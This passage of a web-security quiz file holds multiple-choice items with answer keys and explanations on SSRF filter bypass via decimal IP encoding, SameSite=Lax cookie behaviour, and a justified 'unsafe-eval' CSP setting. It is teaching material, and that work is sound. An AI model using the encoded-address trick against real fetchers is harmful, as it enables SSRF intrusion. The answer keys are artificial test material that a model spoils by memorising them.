  options: ["The resolver reads it as 127.0.0.1, which the string check never saw", "Browsers rewrite numeric hosts to the metadata address on redirect", "Any URL without a dot bypasses TLS, so the fetch happens in plain text", "Port 80 is implied, and the blocklist only covers explicit port numbers"]
  answer: 0
  explanation: >-
    2130706433 is 127.0.0.1 written as one 32-bit number, and getaddrinfo accepts it, as it accepts hex and IPv6-mapped forms. Only a check on the resolved address catches every encoding, and even then the fetcher must connect to the address it checked and re-check redirects. Ports and TLS are unrelated to the bypass.
- q: >-
    Which request does SameSite=Lax NOT stop the browser from sending the session cookie with?
  options: ["A top-level GET navigation from another site to your page", "A cross-site form POST that submits itself when the page loads", "A cross-site image tag whose src points at your API", "A cross-site fetch() call that uses the DELETE method"]
  answer: 0
  explanation: >-
    Lax sends cookies on top-level GET navigations so that links into your site keep users logged in. That is why state-changing operations must never be GETs. The auto-submitting POST and the cross-site DELETE use unsafe methods, and the image is a cross-site sub-request; Lax withholds the cookie from all three.
- q: >-
    The CSP in security_headers.rs includes 'unsafe-eval'. What makes this acceptable?
  options: ["Nothing; every 'unsafe-' keyword should be removed at once", "The policy also allows 'unsafe-inline' scripts, which cancels it out", "The runners need it, and learner code runs in time-limited workers", "It only relaxes CSS evaluation, so script execution is still locked down"]
  answer: 2
  explanation: >-
    A weakened control can be acceptable when the need is real and the compensating controls are explicit: Pyodide and the JavaScript sandbox need eval and WebAssembly, and learner code runs in Web Workers with no DOM that are terminated at a time limit, the JavaScript worker also losing its network APIs. The policy still forbids inline scripts, which blocks the most common injection payloads. 'unsafe-eval' governs script execution, not CSS, 'unsafe-inline' would weaken the policy further rather than cancel anything, and removing 'unsafe-eval' outright would break the runners.
```
